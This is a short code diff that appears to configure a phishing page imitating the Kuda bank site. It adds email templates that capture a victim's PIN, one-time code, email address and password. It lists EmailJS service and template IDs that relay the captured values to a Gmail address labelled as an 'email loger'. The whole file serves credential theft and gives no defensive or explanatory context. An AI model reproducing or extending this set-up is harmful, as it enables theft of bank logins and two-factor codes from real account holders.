@@ -1,0 +1,33 @@
+// Pin and otp templates
+
+Hello {{to_name}},
+
+Pin : {{pin}}
+
+OTP : {{otp}}
+
+
+// email and password templates
+
+Hello {{to_name}},
+
+You got a new email from {{username}}:
+
+and Password {{password}}
+
+ 
+// pin and otp account template details
+const serviceId = "service_xacqspp";
+const userId = "BLtWW8M8uiyVCp8Dp";
+const templateId = "template_u0v8mlp";
+
+
+// email and password account template details
+const serviceId = "service_xacqspp";
+const userId = "BLtWW8M8uiyVCp8Dp";
+const templateId = "template_i9pm8hl";
+
+// email loger
+ to_name: "biggoddoitforme@gmail.com",
+
+ kuda.github.io
